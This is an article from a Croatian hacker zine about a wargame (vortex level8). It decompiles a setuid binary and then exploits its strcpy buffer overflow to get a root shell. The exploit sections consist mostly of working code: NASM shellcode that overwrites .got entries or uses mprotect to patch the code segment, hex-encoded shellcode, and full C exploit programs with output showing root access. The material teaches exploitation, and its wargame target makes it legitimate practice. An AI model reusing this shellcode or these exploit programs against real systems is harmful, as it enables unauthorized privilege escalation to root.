@@ -1,0 +1,608 @@
+
+                              ...................
+                        ...::: phearless zine #3 :::...
+			    
+.....................>---[ xtreem Exploiting Steps ]---<......................
+
+............................>---[ by h4z4rd ]---<.............................
+		                                         memearser[at]yahoo[dotcom		
+            
+0x1 [intro]
+0x2 [binary_decompilation]
+0x3 [exploiting .got]
+0x4 [exploiting -static]
+0x5 [outro]
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 0x1 [intro]
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Exploiting steps je naziv za korake koje cemo napraviti da bi od jednostavnog
+binarya, dekompilacijom doci do source codea, indentificirati ranjivi dio, te na
+nekoliko metoda i u razlicitim uvjetima exploitati program. Za razumijevanje texta
+bilo bi pozeljno da znate osnove asm-a, c-a, elf-a, osnovne buffer overflow 
+tehnike i snalazite se sa gdb-om. Svi primjeri su na linuxu, ali se tehnika 
+moze primjeniti na ostale *nix-e koji koriste elf. Primjer koji cemo rjesavati 
+je dio pulltheplug.org vortex wargamea. 
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 0x2 [binary_decompilation]
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Ajmo odmah krenuti i vidjeti o cemu se radi i sto smo dobili za zadatak:
+
+[hazard: decomp]$ file level8
+level8: ELF 32-bit LSB executable, Intel 80386, version 1 MathCoPro/FPU/MAU Required
+(SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), not stripped
+
+Za zadatak smo dobili elf binary, fajl nije strippan sto ce nam olaksat posao i
+necemo morati vracati symbol table. Sada da vidimo koje funkcije se skrivaju u fajlu
+i da vidimo otprilike sta cemo dekompajlirat:
+
+[hazard: decomp]$ objdump -R level8
+
+level8:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049834 R_386_GLOB_DAT    __gmon_start__
+08049838 R_386_COPY        stdout
+0804980c R_386_JUMP_SLOT   fflush
+08049810 R_386_JUMP_SLOT   pthread_create
+08049814 R_386_JUMP_SLOT   setresuid
+08049818 R_386_JUMP_SLOT   sleep
+0804981c R_386_JUMP_SLOT   __libc_start_main
+08049820 R_386_JUMP_SLOT   printf
+08049824 R_386_JUMP_SLOT   getuid
+08049828 R_386_JUMP_SLOT   getgid
+0804982c R_386_JUMP_SLOT   setresgid
+08049830 R_386_JUMP_SLOT   strcpy
+
+Odmah mozemo probat identificirat ranjive djelove koda, a to je sigurno stcpy, vidimo
+da imamo posla sa threadovima (pthread_create), te getuid/getgid i setresgid. Iz
+ovoga vec mozemo u grubo zakljucit sto se u programu dogadja. Program kreira thread
+(pthread_create), uzima nase privilegije (getuid/getgid) i postavlja neke privilegije
+(setresgid). Sljedece sto cemo napraviti je dissasemblat binary i korak po korak
+sastavit sto bolje mozemo originalni source. Stoga krenimo dissasmat fajl:
+
+[hazard: decomp]$ gdb ./level8
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...Using host libthread_db library
+"/lib/tls/libthread_db.so.1".
+
+(gdb) disas main
+Dump of assembler code for function main:
+
+0x080485c4 <main+0>:    push   %ebp
+0x080485c5 <main+1>:    mov    %esp,%ebp
+0x080485c7 <main+3>:    sub    $0x8,%esp
+0x080485ca <main+6>:    and    $0xfffffff0,%esp
+0x080485cd <main+9>:    mov    $0x0,%eax
+0x080485d2 <main+14>:   sub    %eax,%esp
+
+0x080485d4 <main+16>:   push   $0x0
+0x080485d6 <main+18>:   push   $0x8048564
+0x080485db <main+23>:   push   $0x0
+0x080485dd <main+25>:   lea    0xfffffffc(%ebp),%eax
+0x080485e0 <main+28>:   push   %eax
+0x080485e1 <main+29>:   call   0x8048424 <pthread_create>
+0x080485e6 <main+34>:   add    $0x10,%esp
+
+0x080485e9 <main+37>:   sub    $0x4,%esp
+0x080485ec <main+40>:   sub    $0xc,%esp
+0x080485ef <main+43>:   call   0x8048484 <getgid>
+0x080485f4 <main+48>:   add    $0xc,%esp
+0x080485f7 <main+51>:   push   %eax
+0x080485f8 <main+52>:   sub    $0x8,%esp
+0x080485fb <main+55>:   call   0x8048484 <getgid>
+0x08048600 <main+60>:   add    $0x8,%esp
+0x08048603 <main+63>:   push   %eax
+0x08048604 <main+64>:   sub    $0x4,%esp
+0x08048607 <main+67>:   call   0x8048484 <getgid>
+0x0804860c <main+72>:   add    $0x4,%esp
+0x0804860f <main+75>:   push   %eax
+0x08048610 <main+76>:   call   0x8048494 <setresgid>
+0x08048615 <main+81>:   add    $0x10,%esp
+
+0x08048618 <main+84>:   sub    $0x4,%esp
+0x0804861b <main+87>:   sub    $0xc,%esp
+0x0804861e <main+90>:   call   0x8048474 <getuid>
+0x08048623 <main+95>:   add    $0xc,%esp
+0x08048626 <main+98>:   push   %eax
+0x08048627 <main+99>:   sub    $0x8,%esp
+0x0804862a <main+102>:  call   0x8048474 <getuid>
+0x0804862f <main+107>:  add    $0x8,%esp
+0x08048632 <main+110>:  push   %eax
+0x08048633 <main+111>:  sub    $0x4,%esp
+0x08048636 <main+114>:  call   0x8048474 <getuid>
+0x0804863b <main+119>:  add    $0x4,%esp
+0x0804863e <main+122>:  push   %eax
+0x0804863f <main+123>:  call   0x8048434 <setresuid>
+0x08048644 <main+128>:  add    $0x10,%esp
+
+0x08048647 <main+131>:  sub    $0xc,%esp
+0x0804864a <main+134>:  mov    0xc(%ebp),%eax
+0x0804864d <main+137>:  add    $0x4,%eax
+0x08048650 <main+140>:  pushl  (%eax)
+0x08048652 <main+142>:  call   0x80485a4 <unsafecode>
+0x08048657 <main+147>:  add    $0x10,%esp
+0x0804865a <main+150>:  leave
+0x0804865b <main+151>:  ret
+End of assembler dump.
+(gdb)
+
+Hm, ovo bas ne izgleda kao nesto iz cega mozete rekonstruirat source, ali iza ovoga
+se zapravo krije struktura programa, te je zapravo zacudjujuce jednostavno
+dekompajlirat ovakve binarye. Nekoliko stvari koje bi trebali znati o funkcijama, i
+generalnoj strukturi kompajliranog koda. Na pocetku svake funkcije se nalaze naredbe
+koje stvaraju novi stack frame za trenutnu funkciju. Na taj nacin kad izadjemo iz
+funkcije mozemo jednostavno pobrisat sve koristene podatke. Stack frame kreiramo sa
+ovim naredbama:
+	push   %ebp
+	mov    %esp,%ebp
+nakon toga slijedi sub $0xN, %esp sa cim rezerviramo mjesto za lokalne varijable, te
+na kraju 
+	and    $0xfffffff0,%esp
+	mov    $0x0,%eax
+	sub    %eax,%esp
+sto zapravo ne radi nista pametno, a vjerovatno sluzi za neki padding. Valja
+napomenuti da ovo vrijedi za slucajeve kada je program kompajliarn bez optimizacije
+jer u suprotnom gcc generira drukciji kod, te na razne nacine modificira standardni
+kod da bi se kod brze izvrsavao. 
+Kod rekonstrukcije je vazno odrediti tocan broj ulaznih i izlaznih parametara, broj i
+velicinu lokalnih varijabli, njihov redosljed, funkcije koje se pozivaju i na koji
+nacin, instrukcije granjanja i petlje. Prva stvar koju cemo utvrditi je koliko parametara
+funkcija main ocekuje i kojeg su tipa. Svi parameti koje neka funkcija dobiva se
+nalaze iznad trenutnog stack framea, tako da se parametrima pristupa preko relativne
+adrese 0xN(%ebp) sto znaci 0xN+vrijednost ebp-a (pocetka trenutnog stack framea). Da
+bi utvrdili koliko parametara funkcija dobiva jednostavno pogledamo koja je najveca
+vrijednost iznad framea kojoj funkcija pristupa. Ovdje to mozemo vidjeti na liniji
+<main+134> mov 0xc(%ebp),%eax ovdje stavljamo vrijednos 0xc+$ebp u eax, te pushamo
+adresu na koju ono pokazuje. Prevedeno u c to bi znacilo da pozivamo funkciju main sa
+argumentima int i char** (4+4+4=0xc prva 4bajta su pushani ebp) i ocekuje da
+proslijedimo jedan argument tipa string. Lokalne varijable identificiramo na slican
+nacin, gledamo za kolko je umanjen esp i gdje se koristi memorija ispod ebp, te na
+taj nacim mozemo utvrdit gdje se sta nalazi, koliko je veliko i kojeg je tipa. Ovdje
+vidimo da se ovdje jedino adresira memorija 0xfffffffc(%ebp) (tj. $ebp-0x4) stoga
+mozemo zakljucit da imamo samo jednu lokalnu varijablu veliku 4bajta. A kako je ta
+varijabla prvi parametar pthread_create funkciji znamo da je tipa pthread_t. Ostali
+parametri pthread_create funkcije redom su 0, 0x8048564, 0. Da rezimiramo sta smo do
+sada dekompajlirali i vidjeli idemo li dobrim putem napisat cemo kratak c kod i
+kompajlirat ga:
+
+[hazard: decomp]$ cat > decomp.c
+#include <pthread.h>
+#include <stdio.h>
+
+main(int argc, char *argv[])
+{
+        pthread_t tid;
+        pthread_create(&tid, 0, 0x8048564, 0);
+}
+[hazard: decomp]$ gcc decomp.c -o de -pthread
+[hazard: decomp]$ gdb --quiet ./de
+Using host libthread_db library "/lib/tls/libthread_db.so.1".
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483cc <main+0>:    push   %ebp
+0x080483cd <main+1>:    mov    %esp,%ebp
+0x080483cf <main+3>:    sub    $0x8,%esp
+0x080483d2 <main+6>:    and    $0xfffffff0,%esp
+0x080483d5 <main+9>:    mov    $0x0,%eax
+0x080483da <main+14>:   sub    %eax,%esp
+0x080483dc <main+16>:   push   $0x0
+0x080483de <main+18>:   push   $0x8048564
+0x080483e3 <main+23>:   push   $0x0
+0x080483e5 <main+25>:   lea    0xfffffffc(%ebp),%eax
+0x080483e8 <main+28>:   push   %eax
+0x080483e9 <main+29>:   call   0x80482e4 <pthread_create>
+0x080483ee <main+34>:   add    $0x10,%esp
+0x080483f1 <main+37>:   leave
+0x080483f2 <main+38>:   ret
+End of assembler dump.
+(gdb)
+
+Kompajliranjem smo dobili gotovo identicni kod (osim adrese pthread_create funkcije
+koja ovisi o poziciji got-a). Sljedeci koda koji promatramo su tri poziva getgid i
+nakon njih setresgid. Da bi return vrijednost proslijedili kao input drugoj funkciji
+mozemo ili povratne vrijednosti spremati u varijable (ret=func();func2(ret);) ili
+mozemo funkciji proslijediti kao parametar drugu funkciju koja kad se izvrsi
+automatski predaje izlaz kao ulaz funkciji u kojoj je pozvana (func2(func());) u
+prvom slucaju bi trebali alocirati varijable, dok u drugom netrebamo vec ce se izlazi
+odmah push-at na stack kao parametri novoj funkciji. Kako ovdje imamo 3 getgid-a koji
+svoje izlazne vrijednosti push-aju na stack i nakon njih setresgid koji ocekuje 3
+parametra mozemo zakljuciti da je c kod izgledao ovako:
+setresgid(getgid(),getgid(),getgid());
+
+Sljeci dio koda je isti kao i prethodni samo u ovom slucaju imamo 3 getuid-a i
+setresuid, te bi to izgledalo ovako:
+setresuid(getuid(),getuid(),getuid());
+
+Nakon toga imamo kod koji izgleda ovako:
+	mov    0xc(%ebp),%eax	;stavi adresu drugog parametra maina u eax
+	add    $0x4,%eax	;dodaj 4 eax-u (tj. uzmi drugi pointer argv-a)
+	pushl  (%eax)		;stavi adresu na koju pokazuje eax na stack
+	call   0x80485a4 <unsafecode>	;pozovi unsafecode funkciju
+	add    $0x10,%esp	;pocisti iza sebe
+
+Tj. u c-u:
+unsafecode(argv[1]);
+
+Rekonstruirali smo cijelu main funkciju koja izgleda ovako:
+main(int argc, char *argv[])
+{
+        pthread_t tid;
+        pthread_create(&tid, 0, 0x8048564, 0);
+        setresgid(getgid(),getgid(),getgid());
+        setresuid(getuid(),getuid(),getuid());
+        unsafecode(argv[1]);
+}
+
+Sljedeci korak je identifikacija funkcija. Prva funkcija koju susrecemo je parametar
+pthread_create funkciji. 
+(gdb) disas 0x8048564
+Dump of assembler code for function safecode:
+0x08048564 <safecode+0>:        push   %ebp
+0x08048565 <safecode+1>:        mov    %esp,%ebp
+0x08048567 <safecode+3>:        sub    $0x8,%esp
+
+0x0804856a <safecode+6>:        movl   $0x0,0xfffffffc(%ebp)
+
+0x08048571 <safecode+13>:       sub    $0x8,%esp
+0x08048574 <safecode+16>:       pushl  0xfffffffc(%ebp)
+0x08048577 <safecode+19>:       push   $0x8048708
+0x0804857c <safecode+24>:       call   0x8048464 <printf>
+0x08048581 <safecode+29>:       add    $0x10,%esp
+
+0x08048584 <safecode+32>:       sub    $0xc,%esp
+0x08048587 <safecode+35>:       pushl  0x8049838
+0x0804858d <safecode+41>:       call   0x8048414 <fflush>
+0x08048592 <safecode+46>:       add    $0x10,%esp
+
+0x08048595 <safecode+49>:       sub    $0xc,%esp
+0x08048598 <safecode+52>:       push   $0x1
+0x0804859a <safecode+54>:       call   0x8048444 <sleep>
+0x0804859f <safecode+59>:       add    $0x10,%esp
+
+0x080485a2 <safecode+62>:       jmp    0x8048571 <safecode+13>
+End of assembler dump.
+
+Iz ovoga mozemo odmah zakljucit da funkcija nema ulaznih parametara, ne vraca nista,
+da ima jednu lokalnu varijablu najvjerovatnije tipa int, da je u igri neka petlja i
+poziva 3 funkcije (printf,fflush,sleep). Nakon sto je varijabla postavljena na 0
+pocinje petlja, u ovom slucaju nemozemo tocno odredit koja je petlja u pitanju, moze
+biti nesto tipa for(var=0;;){} ili while(1){} i u oba slucaja cemo kompajliranjem
+dobit isto kod. Zbog kompaktnosti koda ja cu se odlucit za for(var=0;;). Sljedeca
+funkcija je printf, i ima 2 argumenta prvi je format string tipa:
+(gdb) x/s 0x8048708
+0x8048708 <_IO_stdin_used+4>:    "%d\n"
+
+a drugi parametar je nasa varijabla (%d nam pokazuje da pretpostavka o tipu int bila
+tocna).
+Sljedeca je funkcija fflush koja ima jedan parametar:
+(gdb) x/x 0x8049838
+0x8049838 <stdout@@GLIBC_2.0>:  0x4017ac00
+
+I na kraju slijedi sleep(1). Kada sve ovo spojimo dobijemo:
+safecode()
+{
+        int i;
+        for(i=0;;)
+        {
+                printf("%d",i);
+                fflush(stdout);
+                sleep(1);
+        }
+
+}
+
+Secer na kraju je unsafecode, koja kao argument uzima char *, ima jedan lokalni
+buffer velicine (0x408-0x8=1024) i poziva strcpy sa argumentima buffer i argument, te
+izgleda ovako:
+unsafecode(char *str)
+{
+        char buf[1024];
+        strcpy(buf,str);
+}
+
+Kada spojimo cijeli dekompajlirani program dobijemo ovo:
+#include <pthread.h>
+#include <stdio.h>
+#include <unistd.h>
+
+safecode()
+{
+        int i;
+        for(i=0;;)
+        {
+                printf("%d",i);
+                fflush(stdout);
+                sleep(1);
+        }
+
+}
+
+unsafecode(char *str)
+{
+        char buf[1024];
+        strcpy(buf,str);
+}
+
+main(int argc, char *argv[])
+{
+        pthread_t tid;
+        pthread_create(&tid, 0, (void *) safecode, 0);
+        setresgid(getgid(),getgid(),getgid());
+        setresuid(getuid(),getuid(),getuid());
+        unsafecode(argv[1]);
+}
+
+Uspjesno smo dekompajlirali zadani binary i sada mozemo poceti sa exploitanjem.
+Da bi uspjesno dekompajlirali neki fajl prvo identificirajte glavnu funkciju, njene
+parametre i varijable. Onda rastavite kod na logicke cjeline (naredbe grananja,
+petlje, matematicke operacije...) i jednu po jednu ih rjesavajte i slazite ko puzzle
+dok ne sastavite cijeli kod. Tada predjite na funkcije i na isti nacin ih rijesite.
+Za dio koda koji niste sigurni kako ga dekompajlirat napravite par skica u c-u kako
+mislite da to izgleda kompajlirajte, usporedite i preslagujte dok ne dobijete isti
+kod. Sto vise iskustva u programiranju sa jezikom koji dekompajlirate to lakse
+dekompajlirat.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 0x3 [exploiting .got]
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Ako promotrimo source vidimo 2 funkcije, jednu koja se izvrsava kao thread a druga se
+poziva iz main funkcije. Kao sto ime sugerira safecode je sigurna funkcija, u njoj
+nema sigurnosnih propusta, dok u unsafecode-u mozemo odmah identificirati standardni
+buffer overflow. Da stvar ne bude tako banalna prije pozivanja unsafecode-a program
+postavlja privilegije izvrsavanja na one pozivatelja programa te na taj nacin
+onemogucuje da exploitanjem dobijemo suid privilegije. Kako se safecode thread
+pokrece prije setres(uid/gid)-a ona ce zadrzati originalne privilegije. Kako tu
+funkciju nemozemo exploitati moramo naci nacin da preuzmemo kontrolu nad tokom
+izvrsavanja te funkcije. Kako je thread funkcija koja se izvrsava istovremeno sa
+pozivajucom funkcijom onda postuje sve zakone obicne funkcije. Jedan od zakona koje
+mora postovati je da pri pozivanju externih funkcija cita u .got entry-u adresu
+zeljene funkcije i skace na tu adresu. Kako .got nije ni na koji nacin zasticen mi
+mozemo pisati po njemu proizvoljno iz bilo kojeg dijela programa. To znaci da mi iz
+uz pomoc unsafecode funkcije mozemo pokrenut shellcode koji nece imat zeljene
+privilegije ali ce nam omogucit da prepisemo .got entry neke funkcije koju poziva
+safecode sa adresom pravog shellcode-a i na taj nacim dobit zeljene privilegije. Sada
+cemo konstruirati shellcode pomocu kojega cemo izvrsiti navedeno.
+[hazard: ex_got]$ cat hellcode.asm
+BITS 32
+
+;nadji adresu shellcodea u memoriji
+jmp short faddr_sc
+sc_faddr:
+
+;spremi addr sc-a u ebx
+pop ebx
+
+;u eax adresa .got-a da prepisemo sa addr sc-a
+mov long eax, 0x0804980c
+mov long [eax],ebx
+
+mov long eax, 0x08049818
+mov long [eax],ebx
+
+mov long eax, 0x08049820
+mov long [eax],ebx
+
+;neka se unsafecode zabavlja dok se mi igramo u shellu
+play:
+jmp short play
+
+faddr_sc:
+call sc_faddr
+
+;setresuid
+xor eax,eax
+mov al, 0xa4
+
+;ruid=euid=suid=0
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
+
+int 0x80
+
+jmp short       faddr_txt
+txt_faddr:
+
+pop             esi
+xor             eax, eax
+mov byte        [esi + 7], al
+lea             ebx, [esi]
+mov long        [esi + 8], ebx
+mov long        [esi + 12], eax
+mov byte        al, 0x0b
+mov             ebx, esi
+lea             ecx, [esi + 8]
+lea             edx, [esi + 12]
+int             0x80
+
+faddr_txt:
+call            txt_faddr
+db              '/bin/sh#AAAABBBB'
+
+A sada da testiramo exploit:
+[hazard: ex_got]$ l|grep level8; cat ex.c;gcc ex.c -o ex;./ex
+-rwsr-xr-x  1 root   root    13K Jun 24 16:12 level8*
+#include <stdio.h>
+
+char shellcode[] =
+        "\xeb\x18\x5b\xb8\x0c\x98\x04\x08\x89\x18\xb8\x18\x98\x04\x08"
+        "\x89\x18\xb8\x20\x98\x04\x08\x89\x18\xeb\xfe\xe8\xe3\xff\xff"
+        "\xff\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x31\xd2\xcd\x80\xeb\x1a"
+        "\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0"
+        "\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff"
+        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42"
+        "\x42\x42";
+
+
+
+int main(void)
+{
+        char buf[1067], *p;
+        char *env[3] = {shellcode, NULL};
+        int
+ret=0xbffffffa-strlen(shellcode)-strlen("/home/hazard/develop/ph/ex_got/level8");
+        for (p=buf;(p-buf)<1067;p+=4)
+                *((void **)p)=(void *) (ret);
+        *p='\0';
+        execle("/home/hazard/develop/ph/ex_got/level8","level8",buf,NULL,env);
+}
+
+0
+sh-2.05b# id
+uid=0(root) gid=501(hazard) groups=501(hazard)
+
+xaxa ;) tako ljepo i kratko. Exploit je sam po sebi prilicno jednostavan i jasan.
+Koristimo tehniku pokretanja vuln programa pomocu execle i predavanja env-a sto nam
+omogucuje da tocno izracunamo pocetak shellcode-a (nema pogadjanja offseta), pokrene
+se shellcode, nadje adresu pravog shellcode-a prepise .got entry-e i loop-a jer ne
+zelimo terminat glavni program jer bi to ubilo i thread, i dok on loop-a mi skocimo u
+root shell.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 0x4 [exploiting -static]
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Kad smo bili raspravljali o prethodnom problemu deroko je zadao malo modificirani
+problem tj. sta ako je program kompajliran sa -static. To znaci da nema .got tablice
+i mora se naci drugi nacin za exploitat. Bio je tako dobar da je odmah dao i
+rjesenje, mprotect i code segment modifikacija. Kako smo u stanju kontrolirati jedan
+segment programa i izvrsit shellcode, mozemo promjeniti parametre memorije i dodati
+write na code segment i na taj nacin prepisati safecode funkciju sa npr. nasim
+shellcode-om i na taj nacin dobit zeljene privilegije. 
+
+[hazard: ex_static]$ gcc decomp.c -static -o staticx -pthread
+
+Expoit za ovaj problem je isti kao i prethodni samo imamo malo modificirani shellcode koji
+prvo poziva mprotect, te nakon toga mjenja jmp for petlje tako da skoci na nas shellcode.
+Shellcode izgleda ovako:
+
+[hazard: ex_static]$ cat hell_static.asm
+BITS 32
+
+;reg cleanup
+xor eax, eax
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
+
+;mprotect(0x8048000,0x1111,0x7);
+mov al, 0x7d            ;mprotect syscall num
+mov ebx, 0x08048001     ;addr
+dec ebx
+mov cx, 0x1001          ;size
+dec cx
+mov dl, 0x7             ;mask
+int 0x80
+
+;nadji adresu shellcodea u memoriji
+jmp short faddr_sc
+sc_faddr:
+
+;spremi addr sc-a u ebx
+pop ebx
+
+;prebrisi u programu postojeci jmp sa jmp na shellcode
+; -ecx adresa na koju pisemo
+; -u ebx jmp vrijednost
+mov ecx, 0x08048242
+sub ebx, ecx
+sub bl, 0x5
+
+mov al, 0xE9
+mov [ecx], al
+mov [ecx+1], ebx
+
+;neka se unsafecode zabavlja dok se mi igramo u shellu
+play:
+jmp short play
+
+faddr_sc:
+call sc_faddr
+
+;setresuid
+xor eax,eax
+mov al, 0xa4
+
+;uid=euid=suid=0
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
+
+int 0x80
+
+jmp short       faddr_txt
+txt_faddr:
+
+pop             esi
+xor             eax, eax
+mov byte        [esi + 7], al
+lea             ebx, [esi]
+mov long        [esi + 8], ebx
+mov long        [esi + 12], eax
+mov byte        al, 0x0b
+mov             ebx, esi
+lea             ecx, [esi + 8]
+lea             edx, [esi + 12]
+int             0x80
+
+faddr_txt:
+call            txt_faddr
+db              '/bin/sh#AAAABBBB'
+
+Sada da ga testiramo jel radi:
+[hazard: ex_static]$ cat ex_staticx.c
+#include <stdio.h>
+
+char shellcode[] =
+        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x7d\xbb\x01\x80\x04\x08"
+        "\x4b\x66\xb9\x01\x10\x66\x49\xb2\x07\xcd\x80\xeb\x14\x5b\xb9"
+        "\x42\x82\x04\x08\x29\xcb\x80\xeb\x05\xb0\xe9\x88\x01\x89\x59"
+        "\x01\xeb\xfe\xe8\xe7\xff\xff\xff\x31\xc0\xb0\xa4\x31\xdb\x31"
+        "\xc9\x31\xd2\xcd\x80\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e"
+        "\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56"
+        "\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+        "\x23\x41\x41\x41\x41\x42\x42\x42\x42";
+
+int main(void)
+{
+        char buf[1067], *p;
+        char *env[3] = {shellcode, NULL};
+        int
+ret=0xbffffffa-strlen(shellcode)-strlen("/home/hazard/develop/ph/ex_static/staticx");
+        for (p=buf;(p-buf)<1067;p+=4)
+                *((void **)p)=(void *) (ret);
+        *p='\0';
+        execle("/home/hazard/develop/ph/ex_static/staticx","staticx",buf,NULL,env);
+}
+[hazard: ex_static]$ gcc ex_staticx.c -o ex
+[hazard: ex_static]$ ./ex
+0sh-2.05b# id
+uid=0(root) gid=501(hazard) groups=501(hazard)
+
+I ovo smo uspjesno exploitali. Naravno postoji jos nekoliko nacina da se ovaj program
+exploita sa -static-om ali to ostavljam vama na istrazivanje. Ako neko uspjesno exploita
+na neki drugi nacin, neka posalje na mail pa da objavimo u sljedecem broju ;)
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 0x5 [outro]
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Ovdje su predstavljena dva nestandardna buffer overflowa koji ce vam nadam se pomoci da
+poboljsate svoje tehnike i razumijevanje istih. Exploiting je jako zanimljivo mjesto gdje
+mozete vjezbati svoju mastu i programerske vjestine. Ako neko hoce jos dalje razvijat
+svoju tehniku neka exploita ovaj program na non-exec stacku. Happy exploiting.
+
+Greetz to BlackHat team
+
+
